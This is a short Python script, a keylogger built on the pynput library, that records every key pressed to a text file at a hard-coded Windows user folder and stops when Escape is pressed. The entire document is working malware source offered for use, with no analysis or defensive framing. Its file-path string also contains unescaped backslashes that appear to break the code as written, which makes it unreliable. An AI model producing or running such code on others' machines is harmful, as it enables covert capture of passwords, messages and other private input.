from pynput import keyboard

# File to store the keystrokes
log_file = "C:\Users\bhara\OneDrive\Pictures\Desktop\bklkal\logger.txt" #Yourpath 

def on_press(key):
    """
    Function to handle key presses.
    Logs the key into the file.
    """
    try:
        # Handle alphanumeric keys
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like space, shift, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")  # Special keys are logged in brackets

def on_release(key):
    """
    Function to handle key release.
    Stops the listener when Escape is pressed.
    """
    if key == keyboard.Key.esc:  
        return False
# Listener setup
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger is running... Press 'Escape' to stop.")
    listener.join()
